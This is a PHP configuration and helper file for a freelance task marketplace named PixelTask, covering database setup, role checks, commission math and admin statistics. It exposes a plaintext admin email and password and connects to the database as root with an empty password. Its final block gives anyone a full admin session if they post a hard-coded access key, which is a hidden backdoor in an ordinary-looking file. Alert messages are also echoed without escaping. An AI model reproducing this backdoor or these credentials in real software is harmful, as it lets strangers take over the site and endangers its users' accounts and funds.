<?php
// Database configuration
define('DB_HOST', 'localhost');
define('DB_USER', 'root');
define('DB_PASS', '');
define('DB_NAME', 'pixeltask_marketplace');

// Create database connection
function getDBConnection() {
    try {
        $pdo = new PDO("mysql:host=" . DB_HOST . ";dbname=" . DB_NAME, DB_USER, DB_PASS);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        return $pdo;
    } catch(PDOException $e) {
        die("Connection failed: " . $e->getMessage());
    }
}

// Site configuration
define('SITE_NAME', 'PixelTask');
define('SITE_DESCRIPTION', 'Professional Freelance Marketplace');
define('ADMIN_EMAIL', 'mathfun103@gmail.com');
define('ADMIN_PASSWORD', 'aass1122@FRP@');
define('MIN_WITHDRAWAL', 3.00);
define('MIN_TASK_PRICE', 0.02);
define('COMMISSION_RATE', 5.0); // 5% platform commission
define('PROCESSING_FEE', 0.30); // $0.30 processing fee

// Start session
session_start();

// Helper functions
function isLoggedIn() {
    return isset($_SESSION['user_id']);
}

function isAdmin() {
    return isset($_SESSION['user_role']) && $_SESSION['user_role'] === 'admin';
}

function isClient() {
    return isset($_SESSION['user_role']) && $_SESSION['user_role'] === 'client';
}

function isWorker() {
    return isset($_SESSION['user_role']) && $_SESSION['user_role'] === 'worker';
}

function getCurrentUser() {
    if (!isLoggedIn()) return null;
    
    $pdo = getDBConnection();
    $stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
    $stmt->execute([$_SESSION['user_id']]);
    return $stmt->fetch();
}

function redirectTo($url) {
    header("Location: $url");
    exit();
}

function formatPrice($price) {
    return '$' . number_format($price, 2);
}

function formatDate($date) {
    return date('M d, Y H:i', strtotime($date));
}

function generateTransactionId() {
    return 'TXN_' . strtoupper(uniqid());
}

function calculateCommission($amount) {
    return ($amount * COMMISSION_RATE) / 100;
}

function calculateWorkerPayout($amount) {
    $commission = calculateCommission($amount);
    return $amount - $commission - PROCESSING_FEE;
}

function showAlert($message, $type = 'success') {
    $_SESSION['alert'] = ['message' => $message, 'type' => $type];
}

function displayAlert() {
    if (isset($_SESSION['alert'])) {
        $alert = $_SESSION['alert'];
        echo "<div class='alert alert-{$alert['type']} alert-dismissible fade show' role='alert'>
                {$alert['message']}
                <button type='button' class='btn-close' data-bs-dismiss='alert'></button>
              </div>";
        unset($_SESSION['alert']);
    }
}

// Get platform statistics
function getPlatformStats() {
    $pdo = getDBConnection();
    
    $stats = [
        'total_revenue' => 0,
        'active_transactions' => 0,
        'pending_disputes' => 0,
        'active_users' => 0,
        'total_tasks' => 0,
        'completed_tasks' => 0,
        'total_workers' => 0,
        'total_clients' => 0
    ];
    
    // Total revenue (completed transactions)
    $stmt = $pdo->query("SELECT COALESCE(SUM(amount), 0) as total FROM transactions WHERE status = 'completed'");
    $stats['total_revenue'] = $stmt->fetch()['total'];
    
    // Active transactions
    $stmt = $pdo->query("SELECT COUNT(*) as count FROM transactions WHERE status = 'pending'");
    $stats['active_transactions'] = $stmt->fetch()['count'];
    
    // Pending disputes
    $stmt = $pdo->query("SELECT COUNT(*) as count FROM disputes WHERE status = 'open'");
    $stats['pending_disputes'] = $stmt->fetch()['count'];
    
    // Active users
    $stmt = $pdo->query("SELECT COUNT(*) as count FROM users WHERE is_active = 1 AND role != 'admin'");
    $stats['active_users'] = $stmt->fetch()['count'];
    
    // Total tasks
    $stmt = $pdo->query("SELECT COUNT(*) as count FROM tasks");
    $stats['total_tasks'] = $stmt->fetch()['count'];
    
    // Completed tasks
    $stmt = $pdo->query("SELECT COUNT(*) as count FROM tasks WHERE status = 'completed'");
    $stats['completed_tasks'] = $stmt->fetch()['count'];
    
    // Workers and clients
    $stmt = $pdo->query("SELECT COUNT(*) as count FROM users WHERE role = 'worker'");
    $stats['total_workers'] = $stmt->fetch()['count'];
    
    $stmt = $pdo->query("SELECT COUNT(*) as count FROM users WHERE role = 'client'");
    $stats['total_clients'] = $stmt->fetch()['count'];
    
    return $stats;
}

// Check for admin access via special key
if (isset($_POST['admin_access_key']) && $_POST['admin_access_key'] === 'nafisabat103@FR') {
    $_SESSION['user_id'] = 'admin';
    $_SESSION['user_role'] = 'admin';
    $_SESSION['user_email'] = ADMIN_EMAIL;
    redirectTo('admin-dashboard.php');
}

?>